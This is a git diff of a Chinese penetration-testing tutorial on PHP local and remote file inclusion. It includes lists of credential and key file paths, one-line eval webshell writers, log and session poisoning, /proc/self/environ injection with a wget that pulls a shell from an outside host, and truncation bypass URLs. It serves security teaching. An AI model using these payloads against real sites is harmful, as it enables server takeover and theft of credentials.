@@ -29,8 +29,8 @@
 
 ## 4、文件包含漏洞分类
 
-* 本地文件包含（ Local File Include \(LFI\)）：包含本地服务器的文件
-* 远程文件包含（Remote File Include \(RFI\)）：可以包含其他服务器的文件可以包含图片等等类型如果图片为PHP脚本语法也会被以PHP形式解析文件包含
+* 本地文件包含（ Local File Include (LFI)）：包含本地服务器的文件
+* 远程文件包含（Remote File Include (RFI)）：可以包含其他服务器的文件可以包含图片等等类型如果图片为PHP脚本语法也会被以PHP形式解析文件包含
 
 远程包含与本地包含没有区别，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。
 
@@ -38,60 +38,29 @@
 
 ### **Php**
 
-| 相关的PHP函数 | 功能解释 | 错误时的操作 |
-| :--- | :--- | :--- |
-| include | 语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中 | 引入的文件有错误时，只生成警告（E\_WARNING），并且脚本会继续执行脚本 |
-| include\_once | 此行为和 include 语句功能类似，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。 |  |
-| require | 语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 require 语句的文件中 | 引入的文件有错误时，会生成致命错误（E\_COMPILE\_ERROR）并停止脚本运行 |
-| require\_once | 与 require 语句功能类似，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。 |  |
+| 相关的PHP函数      | 功能解释                                                     | 错误时的操作                                      |
+| ------------- | -------------------------------------------------------- | ------------------------------------------- |
+| include       | 语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中            | 引入的文件有错误时，只生成警告（E\_WARNING），并且脚本会继续执行脚本     |
+| include\_once | 此行为和 include 语句功能类似，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。 |                                             |
+| require       | 语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 require 语句的文件中            | 引入的文件有错误时，会生成致命错误（E\_COMPILE\_ERROR）并停止脚本运行 |
+| require\_once | 与 require 语句功能类似，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。    |                                             |
 
 * include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。
-* include\_once\(\)，require\_once\(\)这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。
+* include\_once()，require\_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。
 
-<table>
-  <thead>
-    <tr>
-      <th style="text-align:left">PHP&#x51FD;&#x6570;</th>
-      <th style="text-align:left">&#x529F;&#x80FD;&#x89E3;&#x91CA;</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td style="text-align:left">highlight_file</td>
-      <td style="text-align:left">&#x51FD;&#x6570;&#x5BF9;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x8BED;&#x6CD5;&#x9AD8;&#x4EAE;&#x663E;&#x793A;</td>
-    </tr>
-    <tr>
-      <td style="text-align:left">show_source</td>
-      <td style="text-align:left">&#x51FD;&#x6570;&#x5BF9;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x8BED;&#x6CD5;&#x9AD8;&#x4EAE;&#x663E;&#x793A;</td>
-    </tr>
-    <tr>
-      <td style="text-align:left">readfile</td>
-      <td style="text-align:left">
-        <p>&#x51FD;&#x6570;&#x8BFB;&#x53D6;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x5199;&#x5165;&#x5230;&#x8F93;&#x51FA;&#x7F13;&#x51B2;</p>
-        <p>&#x5982;&#x679C;&#x6210;&#x529F;&#xFF0C;&#x8BE5;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x4ECE;&#x6587;&#x4EF6;&#x4E2D;&#x8BFB;&#x5165;&#x7684;&#x5B57;&#x8282;&#x6570;&#x3002;&#x5982;&#x679C;&#x5931;&#x8D25;&#xFF0C;&#x8BE5;&#x51FD;&#x6570;&#x8FD4;&#x56DE;
-          FALSE &#x5E76;&#x9644;&#x5E26;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x3002;&#x60A8;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5728;&#x51FD;&#x6570;&#x540D;&#x524D;&#x9762;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;
-          &apos;@&apos; &#x6765;&#x9690;&#x85CF;&#x9519;&#x8BEF;&#x8F93;&#x51FA;</p>
-      </td>
-    </tr>
-    <tr>
-      <td style="text-align:left">file_get_contents</td>
-      <td style="text-align:left">&#x51FD;&#x6570;&#x628A;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x8BFB;&#x5165;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;</td>
-    </tr>
-    <tr>
-      <td style="text-align:left">fopen</td>
-      <td style="text-align:left">&#x51FD;&#x6570;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x6216;&#x8005; URL</td>
-    </tr>
-    <tr>
-      <td style="text-align:left">file</td>
-      <td style="text-align:left">&#x51FD;&#x6570;&#x628A;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x8BFB;&#x5165;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#x4E2D;</td>
-    </tr>
-  </tbody>
-</table>
+| PHP函数               | 功能解释                                                                                                     |
+| ------------------- | -------------------------------------------------------------------------------------------------------- |
+| highlight\_file     | 函数对文件进行语法高亮显示                                                                                            |
+| show\_source        | 函数对文件进行语法高亮显示                                                                                            |
+| readfile            | <p>函数读取一个文件，并写入到输出缓冲</p><p>如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 '@' 来隐藏错误输出</p> |
+| file\_get\_contents | 函数把整个文件读入一个字符串中                                                                                          |
+| fopen               | 函数打开文件或者 URL                                                                                             |
+| file                | 函数把整个文件读入一个数组中                                                                                           |
 
 ### **Jsp/servlet**
 
-* ava.io.file\(\)
-* java.io.filereader\(\)
+* ava.io.file()
+* java.io.filereader()
 
 ### **Asp**
 
@@ -102,8 +71,8 @@
 
 在php.ini文件里进行配置
 
-* allow\_url\_ fopen :为ON时 \(默认为On\)，能读取远程文件,例如file\_get\_contents\(\)就能读远程文件
-* allow\_url. include :为ON时 \(php5.2之后默认为Off\) ，就可使用include和require等方式包含远程文件
+* allow\_url\_ fopen :为ON时 (默认为On)，能读取远程文件,例如file\_get\_contents()就能读远程文件
+* allow\_url. include :为ON时 (php5.2之后默认为Off) ，就可使用include和require等方式包含远程文件
 
 ## 7、本地文件包含
 
@@ -123,17 +92,17 @@ include($file);
 
 例如：
 
-$\_GET\['filename'\]参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改$\_GET\['filename'\]的值，执行非预期的操作。
+$\_GET\['filename']参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改$\_GET\['filename']的值，执行非预期的操作。
 
 注：即便被包含的文件并不是与当前编程语言相关，甚至为图片，只要文件被包含，其内容会被包含文件包含，并以当前服务器脚本语言执行。
 
 ### **测试结果**
 
-![](../../.gitbook/assets/image%20%28906%29.png)
+![](<../../.gitbook/assets/image (906).png>)
 
 如果包含的文件内容不符合php语言语法的，会直接将文件内容输出，比如：
 
-![](../../.gitbook/assets/image%20%28940%29.png)
+![](<../../.gitbook/assets/image (940).png>)
 
 ### **目录遍历**
 
@@ -146,46 +115,46 @@ include(/web.$file);   //如果有web目录可以用../上一级目录绕过限�
 
 `./` 当前目录 `../` 上一级目录,这样的遍历目录来读取文件
 
-![](../../.gitbook/assets/image%20%28948%29.png)
+![](<../../.gitbook/assets/image (948).png>)
 
 ### **7.1文件包含配置文件**
 
 包含一些敏感的配置文件，获取目标敏感信息
 
-![](../../.gitbook/assets/image%20%28972%29.png)
+![](<../../.gitbook/assets/image (972).png>)
 
 **常见的敏感信息路径：**
 
 **Windows系统：**
 
-> c:\boot.ini          \#查看系统版本  
-> c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件  
-> c:\windows\repair\sam        \#存储 windows 系统初次安装的密码  
-> c:\windows\repair\sam // 存储Windows系统初次安装的密码  
-> c:\ProgramFiles\mysql\my.ini // MySQL配置  
-> c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码  
+> c:\boot.ini          #查看系统版本\
+> c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件\
+> c:\windows\repair\sam        #存储 windows 系统初次安装的密码\
+> c:\windows\repair\sam // 存储Windows系统初次安装的密码\
+> c:\ProgramFiles\mysql\my.ini // MySQL配置\
+> c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码\
 > c:\windows\php.ini // php 配置信息
 
 **Linux：**
 
-> /etc/passwd // 账户信息  
-> /etc/shadow // 账户密码文件  
-> /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件  
-> /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置  
-> /etc/php5/apache2/php.ini //ubuntu 系统的默认路径  
-> /usr/local/app/php5/lib/php.ini // PHP相关配置  
-> /etc/httpd/conf/httpd.conf // Apache配置文件  
-> /etc/my.conf // mysql 配置文件  
->  /etc/resolv.conf  
->  /root/.ssh/known\_hosts  
-> /etc/network/interfaces  
-> /root/ .ssh/authorized\_keys  
-> /root/ .ssh/id\_rsa  
-> /root/ .ssh/id\_ras.keystore  
-> /root/.bash\_history  
-> /root/ .mysql\_history  
-> /proc/self/fd/fd\[0-9\]\*\(文件标识符\)  
-> /proc/mounts  
+> /etc/passwd // 账户信息\
+> /etc/shadow // 账户密码文件\
+> /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件\
+> /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置\
+> /etc/php5/apache2/php.ini //ubuntu 系统的默认路径\
+> /usr/local/app/php5/lib/php.ini // PHP相关配置\
+> /etc/httpd/conf/httpd.conf // Apache配置文件\
+> /etc/my.conf // mysql 配置文件\
+> &#x20;/etc/resolv.conf\
+> &#x20;/root/.ssh/known\_hosts\
+> /etc/network/interfaces\
+> /root/ .ssh/authorized\_keys\
+> /root/ .ssh/id\_rsa\
+> /root/ .ssh/id\_ras.keystore\
+> /root/.bash\_history\
+> /root/ .mysql\_history\
+> /proc/self/fd/fd\[0-9]\*(文件标识符)\
+> /proc/mounts\
 > /porc/config.gz
 
 ......
@@ -194,7 +163,7 @@ include(/web.$file);   //如果有web目录可以用../上一级目录绕过限�
 
 一般用于文件上传，上传图片马后如果存在文件包含漏洞，那么就可以包含执行图片马里面的`php`代码
 
-还可以上传图片马进行生成一个shell.php进行getshell\(条件竞争\)
+还可以上传图片马进行生成一个shell.php进行getshell(条件竞争)
 
 ```php
 <?php fputs(fopen("shell.php","w"),'<? @eval($_POST[shell]);?>');?>
@@ -214,15 +183,15 @@ include(/web.$file);   //如果有web目录可以用../上一级目录绕过限�
 
 windows默认C:\WINDOWS\Temp或集成环境下的tmp文件夹里
 
-![](../../.gitbook/assets/image%20%28958%29.png)
+![](<../../.gitbook/assets/image (958).png>)
 
 Linux下默认存放在/var/lib/php/session目录下
 
-![](../../.gitbook/assets/image%20%28938%29.png)
+![](<../../.gitbook/assets/image (938).png>)
 
 获取方法2：猜测默认的session存放位置
 
-![](../../.gitbook/assets/image%20%28944%29.png)
+![](<../../.gitbook/assets/image (944).png>)
 
 session中的内容可以被控制，传入恶意代码。
 
@@ -243,29 +212,29 @@ $_SESSION["username"]=$ctfs;
 
 session的文件名为sess\_+sessionid，sessionid可以通过开发者模式获取。
 
-![](../../.gitbook/assets/image%20%28905%29.png)
+![](<../../.gitbook/assets/image (905).png>)
 
 所以session的文件名为：5ba03eaaa1b81759bbd60937fe821215
 
 到服务器的D:\phpStudy\PHPTutorial\tmp\tmp目录下查看果然存在此文件，内容为：
 
-![](../../.gitbook/assets/image%20%28932%29.png)
+![](<../../.gitbook/assets/image (932).png>)
 
 **漏洞利用**
 
 通过上面的分析，可以知道ctfs传入的值会存储到session文件中，如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell。
 
-当访问http://127.0.0.1/session.php?ctfs=&lt;?php phpinfo\(\);?&gt;后，会在D:\phpStudy\PHPTutorial\tmp\tmp目录下存储session的值。
+当访问http://127.0.0.1/session.php?ctfs=\<?php phpinfo();?>后，会在D:\phpStudy\PHPTutorial\tmp\tmp目录下存储session的值。
 
-![](../../.gitbook/assets/image%20%28943%29.png)
+![](<../../.gitbook/assets/image (943).png>)
 
-攻击者通过phpinfo\(\)信息泄露或者猜测能获取到session存放的位置，文件名称通过开发者模式可获取到，然后通过文件包含的漏洞解析恶意代码getshell。
+攻击者通过phpinfo()信息泄露或者猜测能获取到session存放的位置，文件名称通过开发者模式可获取到，然后通过文件包含的漏洞解析恶意代码getshell。
 
-![](../../.gitbook/assets/image%20%28962%29.png)
+![](<../../.gitbook/assets/image (962).png>)
 
 **Getshell思路**
 
-![](../../.gitbook/assets/image%20%28907%29.png)
+![](<../../.gitbook/assets/image (907).png>)
 
 **扩展**
 
@@ -277,11 +246,11 @@ burp抓包，写入一句话木马，主要在user-agent最后加入
 
 WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。
 
-在用户发起请求时，服务器会将请求写入access.log\(会记录访问IP、访问链接、Referer和User-Agent等\)，当请求错误时将错误写入error.log
+在用户发起请求时，服务器会将请求写入access.log(会记录访问IP、访问链接、Referer和User-Agent等)，当请求错误时将错误写入error.log
 
 注意：
 
-* 一般情况下日志存储目录会被修改，需要读取服务器配置文件\(httpd.conf ,nginx.conf...\)或者根据phpinfo\(\)中的信息来得知
+* 一般情况下日志存储目录会被修改，需要读取服务器配置文件(httpd.conf ,nginx.conf...)或者根据phpinfo()中的信息来得知
 * 日志记录的信息都可以被调整，比如记录报错的等级，或者内容格式。
 
 **日志文件**
@@ -292,9 +261,9 @@ WEB服务器一般会将用户的访问记录保存在访问日志中。那么�
 
 在D:\phpStudy\PHPTutorial\Apache\conf\httpd.conf的，打开httpd.conf配置文件，第299行
 
-\#\#CustomLog "logs/access.log" common
+\##CustomLog "logs/access.log" common
 
-去掉前边的 \# ，并重启apache。
+去掉前边的 # ，并重启apache。
 
 **日志默认路径**
 
@@ -352,13 +321,13 @@ Windows和linux的路径不一样，但是也有默认的路径
 
 phpstudy的Apache默认路径C:\phpStudy\PHPTutorial\Apache\conf\extra\httpd-vhosts.conf
 
-![](../../.gitbook/assets/image%20%28961%29.png)
+![](<../../.gitbook/assets/image (961).png>)
 
 **二.测试是否可以文件包含**
 
-[http://test.com/test.php?page=C:\phpStudy\PHPTutorial\Apache\logs\access.log](http://test.com/test.php?page=C:\phpStudy\PHPTutorial\Apache\logs\access.log)  ****
+[http://test.com/test.php?page=C:\phpStudy\PHPTutorial\Apache\logs\access.log](http://test.com/test.php?page=C:\phpStudy\PHPTutorial\Apache\logs\access.log)  **** &#x20;
 
-![](../../.gitbook/assets/image%20%28967%29.png)
+![](<../../.gitbook/assets/image (967).png>)
 
 包含错误日志： ?file=../../../../../../../../../var/log/apache/error.log （试试把UA设置为“”来使payload进入日志）
 
@@ -374,15 +343,15 @@ phpstudy的Apache默认路径C:\phpStudy\PHPTutorial\Apache\conf\extra\httpd-vho
 
 利用Burp进行抓包直接把代码写进去
 
-![](../../.gitbook/assets/image%20%28971%29.png)
+![](<../../.gitbook/assets/image (971).png>)
 
 再去访问包含日志文件
 
-![](../../.gitbook/assets/image%20%28926%29.png)
+![](<../../.gitbook/assets/image (926).png>)
 
 **Getshell**
 
-![](../../.gitbook/assets/image%20%28960%29.png)
+![](<../../.gitbook/assets/image (960).png>)
 
 **总结**
 
@@ -394,7 +363,7 @@ phpstudy的Apache默认路径C:\phpStudy\PHPTutorial\Apache\conf\extra\httpd-vho
 
 可以尝试利用 UA 插入 payload 到日志文件
 
-![](../../.gitbook/assets/image%20%28909%29.png)
+![](<../../.gitbook/assets/image (909).png>)
 
 
 
@@ -411,7 +380,7 @@ set srvport 8888
 exploit -z
 ```
 
-![](../../.gitbook/assets/image%20%28966%29.png)
+![](<../../.gitbook/assets/image (966).png>)
 
 参考文章
 
@@ -441,31 +410,31 @@ ssh '<?php phpinfo();?>'@192.168.136.143
 
 这样把用户名写成phpinfo，ssh的登陆日志就会把此次的登陆行为记录到日志中，利用包含漏洞getshell
 
-![](../../.gitbook/assets/image%20%28915%29.png)
+![](<../../.gitbook/assets/image (915).png>)
 
 可以看到我们登陆的行为都被记录到了日志当中
 
-![](../../.gitbook/assets/image%20%28914%29.png)
+![](<../../.gitbook/assets/image (914).png>)
 
 可以看到刚才登陆的时候，成功phpinfo写入到日志文件中并且成功解析
 
-![](../../.gitbook/assets/image%20%28928%29.png)
+![](<../../.gitbook/assets/image (928).png>)
 
 通过phpinfo查看到了网站根目录
 
-![](../../.gitbook/assets/image%20%28964%29.png)
+![](<../../.gitbook/assets/image (964).png>)
 
 本来想着利用文件包含漏洞配合fputs和fopen函数在网站根目录写入一句话木马getshell，但是由于单引号太多就报错了，只能另谋出路
 
-![](../../.gitbook/assets/image%20%28936%29.png)
+![](<../../.gitbook/assets/image (936).png>)
 
 然后就想到了把执行命令的一句话木马写入日志，利用文件包含执行反弹shell
 
-![](../../.gitbook/assets/image%20%28975%29.png)
+![](<../../.gitbook/assets/image (975).png>)
 
 然后构造请求执行命令，因为刚才我写进去的是通过GET方式用panda参数传参，多个参数之间用&符号连接，还是要注意，命令要url编码再执行
 
-![](../../.gitbook/assets/image%20%28977%29.png)
+![](<../../.gitbook/assets/image (977).png>)
 
 参考文章
 
@@ -473,7 +442,7 @@ ssh '<?php phpinfo();?>'@192.168.136.143
 
 ### **7.8 phpMyAdmin包含**
 
- 0x01 phpMyadmin包含session文件
+&#x20;0x01 phpMyadmin包含session文件
 
 首先进入执行SQL语言地方，执行如下操作
 
@@ -483,20 +452,20 @@ select '<?php phpinfo();?>'
 
 打开`F12`查看到`session`名，完整的`session`文件就是`sess_session`名
 
-![](../../.gitbook/assets/image%20%28945%29.png)
+![](<../../.gitbook/assets/image (945).png>)
 
 `phpstudy`里面默认`session`存储位置是`phpstudy`下`tmp/tmp`，于是包含该`session`文件
 
-![](../../.gitbook/assets/image%20%28976%29.png)
+![](<../../.gitbook/assets/image (976).png>)
 
 参考文章
 
-phpMyAdmin CVE-2018-12613  
+phpMyAdmin CVE-2018-12613\
 
 
-[https://blog.csdn.net/weixin\_43872099/article/details/104128639](https://blog.csdn.net/weixin_43872099/article/details/104128639)
+[https://blog.csdn.net/weixin\_43872099/article/details/104128639](https://blog.csdn.net/weixin\_43872099/article/details/104128639)
 
-\[CVE-2014-8959\] phpmyadmin任意文件包含漏洞分析
+\[CVE-2014-8959] phpmyadmin任意文件包含漏洞分析
 
 [https://www.secpulse.com/archives/2595.html](https://www.secpulse.com/archives/2595.html)
 
@@ -506,7 +475,7 @@ phpMyAdmin CVE-2018-12613
 
 **利用方法简述：**
 
-在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是/tmp/php\[6个随机字符\]），文件名可以在$\_FILES变量中找到。这个临时文件，在请求结束后就会被删除。
+在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是/tmp/php\[6个随机字符]），文件名可以在$\_FILES变量中找到。这个临时文件，在请求结束后就会被删除。
 
 同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$\_FILES变量的内容，自然也包含临时文件名。
 
@@ -534,33 +503,33 @@ phpMyAdmin CVE-2018-12613
 
 {% embed url="http://192.168.136.128:8080/lfi.php?file=/etc/passwd" %}
 
-![](../../.gitbook/assets/image%20%28970%29.png)
+![](<../../.gitbook/assets/image (970).png>)
 
 访问phpinfo页面，确实存在
 
-![](../../.gitbook/assets/image%20%28903%29.png)
+![](<../../.gitbook/assets/image (903).png>)
 
 然后利用网上的exp进行利用：
 
 python2 exp.py 目标ip 8080 100
 
-![](../../.gitbook/assets/image%20%28952%29.png)
+![](<../../.gitbook/assets/image (952).png>)
 
 在189次请求时，就写入成功了
 
-脚本exp.py实现了上述过程，成功包含临时文件后，会利用file\_put\_contents函数写入&lt;?=eval\($\_REQUEST\[1\]\)?&gt;一句话后门到/tmp/g文件中，这个文件会永久留在目标机器上
+脚本exp.py实现了上述过程，成功包含临时文件后，会利用file\_put\_contents函数写入\<?=eval($\_REQUEST\[1])?>一句话后门到/tmp/g文件中，这个文件会永久留在目标机器上
 
-![](../../.gitbook/assets/image%20%28965%29.png)
+![](<../../.gitbook/assets/image (965).png>)
 
 然后直接利用蚁剑进行连接即可，密码为1：
 
-![](../../.gitbook/assets/image%20%28912%29.png)
+![](<../../.gitbook/assets/image (912).png>)
 
 ### **7.10包含 /proc/self/environ 文件**
 
 Linux下有一个文件/proc/self/environ，这个文件里保存了系统的一些变量。
 
-![](../../.gitbook/assets/image%20%28951%29.png)
+![](<../../.gitbook/assets/image (951).png>)
 
 利用条件：
 
@@ -576,7 +545,7 @@ proc/self/environ 中会保存 user-agent 头。如果在 user-agent 中插入 p
 
 选择 User-Agent 写代码如下：
 
-> &lt;?system\('wget [http://www.yourweb.com/oneword.txt](http://www.yourweb.com/oneword.txt) -O shell.php'\);?&gt;
+> \<?system('wget [http://www.yourweb.com/oneword.txt](http://www.yourweb.com/oneword.txt) -O shell.php');?>
 
 然后提交请求。
 
@@ -584,9 +553,9 @@ proc/self/environ 中会保存 user-agent 头。如果在 user-agent 中插入 p
 
 检查proc/self/environ是否可以访问     www.aaa.com/view.php?page=../../../../../proc/self/environ
 
-3、如果可读就注入代码     访问：www.aaa.com/view.php?page=../../../../../proc/self/environ     选择User-Agent 写代码如下：&lt;?system\('wget [http://www.yourweb.com/oneword.txt](http://www.yourweb.com/oneword.txt) -O shell.php'\);?&gt;    
+3、如果可读就注入代码     访问：www.aaa.com/view.php?page=../../../../../proc/self/environ     选择User-Agent 写代码如下：\<?system('wget [http://www.yourweb.com/oneword.txt](http://www.yourweb.com/oneword.txt) -O shell.php');?>   &#x20;
 
-//提交请求；我们的命令将被执行\(将下载[http://www.yourweb.com/oneword.txt](http://www.yourweb.com/oneword.txt)，并将其保存为它在shell.php网站目录\)，我们的shell也就被创建,.如果不行，尝试使用exec\(\)，因为系统可能被禁用的从php.ini网络服务器.
+//提交请求；我们的命令将被执行(将下载[http://www.yourweb.com/oneword.txt](http://www.yourweb.com/oneword.txt)，并将其保存为它在shell.php网站目录)，我们的shell也就被创建,.如果不行，尝试使用exec()，因为系统可能被禁用的从php.ini网络服务器.
 
 4、访问shell
 
@@ -596,21 +565,21 @@ proc/self/environ 中会保存 user-agent 头。如果在 user-agent 中插入 p
 
 ### **7.11 文件包含案例**
 
-![](../../.gitbook/assets/image%20%28933%29.png)
+![](<../../.gitbook/assets/image (933).png>)
 
 ## 8、本地文件包含绕过
 
 ### **8.1 %00截断**
 
-PHP 内核是由 C 语言实现的，因此使用了 C 语言中的一些字符串处理函数。在连接字符串时，0 字节 \(\x00\) 将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个 0 字节，就能截断 file 变量之后的字符串。
+PHP 内核是由 C 语言实现的，因此使用了 C 语言中的一些字符串处理函数。在连接字符串时，0 字节 (\x00) 将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个 0 字节，就能截断 file 变量之后的字符串。
 
 **条件**
 
-* PHP版本 &lt; 5.3.4 \(不包括5.3\) ;
+* PHP版本 < 5.3.4 (不包括5.3) ;
 * PHP对所接收的参数，如以上代码的`$_GET['file']`未使用`addslashes`函数。
 * PHP的扩展参数：magic\_quotes\_gpc = Off
 
-因为PHP大于等于5.3的版本已经修复了这个问题，满足一定条件下可以使用`%00`，因为当程序流遇到%00终止符的时候将直接终止。如果开启了`gpc`或者使用了`addslashes`函数的话则会对其进行转义。\(还可以%00 截断目录遍历\)
+因为PHP大于等于5.3的版本已经修复了这个问题，满足一定条件下可以使用`%00`，因为当程序流遇到%00终止符的时候将直接终止。如果开启了`gpc`或者使用了`addslashes`函数的话则会对其进行转义。(还可以%00 截断目录遍历)
 
 代码演示
 
@@ -642,16 +611,16 @@ PHP 内核是由 C 语言实现的，因此使用了 C 语言中的一些字符�
 ?>
 ```
 
- \`\` http://127.0.0.1/include.php?file=../phpinfo.php%00 
+&#x20;\`\` http://127.0.0.1/include.php?file=../phpinfo.php%00&#x20;
 
-![](../../.gitbook/assets/image%20%28902%29.png)
+![](<../../.gitbook/assets/image (902).png>)
 
 ### **8.2 路径长度截断：**
 
 条件：
 
 * windows下目录路径最大长度为256字节，超出部分将丢弃
-*  Linux下目录最大长度为4096字节，超出长度将丢弃
+* &#x20;Linux下目录最大长度为4096字节，超出长度将丢弃
 
 ```php
 <?php
@@ -662,7 +631,7 @@ PHP 内核是由 C 语言实现的，因此使用了 C 语言中的一些字符�
 
 EXP:
 
-```text
+```
 http://www.test.com/FI/FI.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
 ```
 
@@ -681,7 +650,7 @@ http://www.test.com/FI/FI.php?filename=test.txt/././././././././././././././././
 
 EXP:
 
-```text
+```
 http://www.test.com/FI/FI.php
 ?filename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
 ```
@@ -699,11 +668,11 @@ include $a;
 
 访问：[http://127.0.0.1/include.php?page=http://127.0.0.1/2.jpg?](http://127.0.0.1/include.php?page=http://127.0.0.1/2.jpg?)  如图所示：
 
-![](../../.gitbook/assets/image%20%28924%29.png)
+![](<../../.gitbook/assets/image (924).png>)
 
 或者
 
-![](../../.gitbook/assets/image%20%28959%29.png)
+![](<../../.gitbook/assets/image (959).png>)
 
 ### **8.4编码绕过**
 
@@ -731,11 +700,12 @@ include $a;
 * allow\_url\_include = On（是否允许include/require远程文件）
 
 1. 所需的远程文件后缀不能与目标服务器的语言相同，如目标服务器解析PHP代码，则远程文件后缀不能为.php。
-2.  远程包含的文件路径必须是绝对路径
+2. &#x20;远程包含的文件路径必须是绝对路径
 
-> 无限远程文件包含
+> 无限远程文件包含\
+>
 
-那么在远程服务器执行phpinfo\(\)之后，你就可以获得目标服务器的内容。由于它不会运行代码，所以包含的信息不是目标服务器，而是远程服务器。（远程的文件名不能为php可解析的扩展名\(php、php5...）
+那么在远程服务器执行phpinfo()之后，你就可以获得目标服务器的内容。由于它不会运行代码，所以包含的信息不是目标服务器，而是远程服务器。（远程的文件名不能为php可解析的扩展名(php、php5...）
 
 **测试代码：**
 
@@ -750,7 +720,7 @@ include $a;
 
 如下所示：
 
-![](../../.gitbook/assets/image%20%28953%29.png)
+![](<../../.gitbook/assets/image (953).png>)
 
 这是我的PHP5.6版本的远程设备信息，目标设备是5.2版本。
 
@@ -762,27 +732,27 @@ include $a;
 
 此时，远程服务器会执行此代码的源代码，如下所示：
 
-![](../../.gitbook/assets/image%20%28908%29.png)
+![](<../../.gitbook/assets/image (908).png>)
 
 所以为了使这个攻击开始运行，你需要做一些修改：
 
 1、修改配置
 
-![](../../.gitbook/assets/image%20%28904%29.png)
+![](<../../.gitbook/assets/image (904).png>)
 
 2、修改文件后缀
 
-![](../../.gitbook/assets/image%20%28942%29.png)
+![](<../../.gitbook/assets/image (942).png>)
 
 此时，你可以再来尝试一下包含的攻击向量：
 
-![](../../.gitbook/assets/image%20%28918%29.png)
+![](<../../.gitbook/assets/image (918).png>)
 
 那么你可以看到所需的信息在此包含之后返回，并且你的目标设备信息不再改变。
 
 接下来，你要再次为远程文件包含做一个shell示例。
 
-![](../../.gitbook/assets/image%20%28963%29.png)
+![](<../../.gitbook/assets/image (963).png>)
 
 远程文件包含使用的前提是，符合本地文件包含的前提并符合远程文件包含其可用性的前提。
 
@@ -794,9 +764,9 @@ include $a;
 
 先写一个test.txt文件，保存在自己的远程服务器yyy上，内容如下:
 
-&lt;?fputs\(fopen\( "shell.php" , "w"\), "&lt;?php eval\($\_POST\[shell\]\); ?&gt;"\)?&gt;
+\<?fputs(fopen( "shell.php" , "w"), "\<?php eval($\_POST\[shell]); ?>")?>
 
-\(2\)则可以通过访问: http: //Www.xxx.com/index.php?page=http: //www.yyy.com/test.txt
